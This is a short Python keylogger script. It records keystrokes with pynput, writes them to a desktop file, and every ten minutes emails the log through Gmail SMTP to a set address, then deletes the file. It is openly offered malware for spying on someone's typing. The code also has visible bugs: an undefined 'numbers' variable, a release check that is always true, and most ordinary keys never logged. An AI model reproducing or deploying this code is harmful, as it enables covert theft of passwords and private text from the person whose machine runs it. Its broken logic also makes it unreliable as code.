from pynput.keyboard import Listener,Key
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
import os
import threading
import time
##If you want to use this program, you must edit 70. 80. 87. 88. 97. 98 lines with your information.
log = list()
numbers:"0987654321"
shiftfunclist = ["=",")","(","/","&","%","+","^","'","!"]
altgrfunclist = ["}","]","[","{","","½","$","#","£",">"]
shift = False
altgr = False

def logger():
    def press(key):

        global log,shift,altgr   

        try:
            if altgr:
                if key.char in numbers:
                    log.append(altgrfunclist[int(key.char)])
                else:
                    if key.char == "q":
                        log.append("@")
                    if key.char == "*":
                        log.append("\\")
                    if key.char == "-":
                        log.append("|")      
            elif shift:
                if key.char in numbers:
                    log.append(shiftfunclist[int(key.char)]) 
                elif key.char == "*":
                    log.append("?")
                elif key.char == "-":
                    log.append("_")
                else:    
                    log.append(key.char)

        except AttributeError:
            if key == Key.backspace:
                log.append("<")
            if key == Key.delete:
                log.append(">")    
            if key == Key.enter:
                log.append("\n")
            if key == Key.space:
                log.append(" ")
            if key == Key.shift_r or key == Key.shift_l:
                shift=True
            if key == Key.alt_gr:
                altgr = True

        if len(log) > 32:
            writetodocument()
            log = list()

    def release(key):
        global shift, altgr
        if key == Key.shift_r or Key.shift_r:
            shift=False
        if key == Key.alt_gr:
            altgr = False

    def writetodocument():
        
        global log
        with open ("C:/Users/yourusername/Desktop/record.txt","a",encoding="utf-8") as file:
            for k in log:
                 file.write(k)

    with Listener(on_press=press,on_release=release) as listener:
        listener.join()

def send (): 
    while 1:
        time.sleep(600) ##record.txt will be controled 1 time on 10 minutes.  
        loc = "C:/Users/yourusername/Desktop/record.txt"
        try:
            if os.path.getsize(loc) >= 64: ##When record.txt is bigger than or equal 64 byte, it will be send.  
                with open(loc,"r",encoding="utf-8") as file:
                    transfer = file.read()

                com = MIMEMultipart()
                com["From"] = "sendergmailaddress@"
                com["To"] = "receivergmailaddress@" ##In the gmail settings, you should turn on less secure app access. Otherwise, you cannot send mail yourself.
                com["Subject"] = "Records From Keylogger:)"
                
                text = MIMEText(transfer,"plain")
                com.attach(text)

                server = smtplib.SMTP("smtp.gmail.com",587) #this port is for only gmail's servers. Therefore you have to use a gmail address with this port number.
                server.ehlo()
                server.starttls()
                server.login("sendergmailaddress@","senderpassword")
                server.sendmail("sendergmailaddress@","receivermailaddress@",com.as_string()) ##You can enter same mail address to send yourself.
                server.close()
                os.remove(loc)
        except:
            pass

ft = threading.Thread(target=logger)
sc = threading.Thread(target=send)
ft.start()
sc.start()        